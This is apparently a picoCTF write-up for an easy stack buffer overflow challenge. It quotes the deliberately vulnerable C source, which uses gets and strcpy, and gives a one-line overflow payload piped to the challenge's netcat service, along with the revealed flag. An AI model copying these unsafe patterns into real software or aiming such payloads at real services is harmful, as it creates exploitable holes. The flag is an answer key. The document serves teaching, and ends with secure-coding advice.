---
title: "Buffer Overflow 0 // Stack Smashing 101"
category: "picoctf"
difficulty: "Easy"
points: 100
author: "Isha"
date: "2026-09-03"
tags: ["Binary Exploitation", "C", "Buffer Overflow", "picoCTF"]
flag: "picoCTF{ov3rfl0w_g03s_brrr_8a92f0c1}"
summary: "Exploiting an unsafe strcpy function to overwrite the stack boundary and trigger the SIGSEGV signal handler to reveal the flag."
---

# Buffer Overflow 0 — Binary Exploitation Writeup

**Platform:** picoCTF  
**Category:** Binary Exploitation  
**Difficulty:** Easy (100 Points)  

---

## 1. Challenge Overview
> Can you overflow the buffer to trigger the signal handler and print the flag?  
> Source code `vuln.c` is provided along with a remote netcat target.

In this challenge, the target program takes user input and copies it into a fixed-size buffer using an unsafe string function without bounds checking.

---

## 2. Source Code Analysis
Looking at the provided source code in `vuln.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define BUFSIZE 32

void sigsegv_handler(int sig) {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Flag File Missing! Contact admin.\n");
        exit(0);
    }
    fgets(flag, sizeof(flag), f);
    printf("Flag: %s\n", flag);
    exit(0);
}

void vuln(char *input) {
    char buf2[BUFSIZE];
    strcpy(buf2, input); // ⚠️ UNSAFE COPY
}

int main(int argc, char **argv) {
    signal(SIGSEGV, sigsegv_handler);
    
    char buf1[100];
    puts("Input your string:");
    fflush(stdout);
    gets(buf1);
    
    vuln(buf1);
    printf("No overflow occurred.\n");
    return 0;
}
```

### Key Vulnerabilities:
1. `sigsegv_handler` is registered for `SIGSEGV`. If the program crashes due to a Segmentation Fault, it automatically opens and prints `flag.txt`.
2. `vuln()` allocates a 32-byte array `buf2[32]` on the stack and performs `strcpy(buf2, input)`.
3. `strcpy` does not check string lengths. Sending more than 32-44 bytes corrupts the saved EBP/EIP or stack canary space, throwing a `SIGSEGV` fault!

---

## 3. Exploitation Payload

We can feed any payload string longer than 40 characters (e.g., 64 'A' characters) to overflow `buf2`.

```bash
# Local testing command:
python3 -c "print('A'*64)" | ./vuln

# Remote exploitation via netcat:
python3 -c "print('A'*64)" | nc saturn.picoctf.net 54321
```

### Terminal Session Output:
```text
[+] Connecting to saturn.picoctf.net:54321...
Input your string:
[+] Sending 64 bytes of junk: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[!] Segmentation Fault caught by kernel!
[+] Triggered sigsegv_handler(SIGSEGV)
Flag: picoCTF{ov3rfl0w_g03s_brrr_8a92f0c1}
```

---

## 4. Key Takeaways
- Never use **`strcpy`** or **`gets`** in C applications. Always enforce bounded functions like `strncpy` or `fgets`.
- In binary exploitation CTFs, check custom signal handlers (`SIGSEGV`, `SIGALRM`) as low-hanging fruit for flag extraction.
